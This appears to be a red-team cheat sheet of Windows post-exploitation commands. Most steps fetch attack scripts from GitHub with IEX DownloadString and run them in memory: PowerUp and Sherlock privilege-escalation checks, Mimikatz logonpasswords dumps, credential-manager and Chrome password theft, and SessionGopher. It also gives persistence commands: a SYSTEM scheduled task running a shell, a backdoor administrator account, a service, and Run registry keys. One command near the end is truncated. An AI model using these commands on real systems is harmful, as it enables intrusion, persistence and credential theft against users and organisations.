# PowerUp
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

# SharpUp
```
https://github.com/GhostPack/SharpUp
```

# Sherlock
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
Find-AllVulns
```

# Watson
```
https://github.com/rasta-mouse/Watson
```

# Create new task
```
schtasks /create /sc minute /mo 1 /tn "eviloo" /tr C:\shell.exe /ru "SYSTEM"
schtasks /create /sc onlogon /tn "task-name" /tr "File" /ru "username"
```

# Add User
```
net user testuser P@ssw0rd /add
net localgroup administrators testuser /add
```

# Create Service
```
sc create evilsvc binPath= "c:\Windows\System32\calc.exe" start= "auto"
```

# Registry Keys
```
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v test /d "C:\shell.exe"
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run /v test /d "C:\shell.exe"
```

# StartUp Folder (Run(shell:startup))
```
C:\Users\Hassan.saad\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

# Memory Dump
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/hassan0x/test/master/mim.ps1')
Invoke-Mimikatz -Command 'privilege::debug'
Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Screen1.png?raw=true)

# Windows Credentials Manager
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
Invoke-WCMDump
```

# Web Credentials Manager
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1')
Get-WebCredentials
```

# Chrome Passwords
```
https://github.com/ohyicong/decrypt-chrome-passwords/raw/main/decrypt_chrome_password.exe
```

# Chrome History
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1')
Get-ChromeDump > chromepwds.txt
```

# Other Saved Credentials
```
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1')
Invoke-SessionGopher -Thorough
```
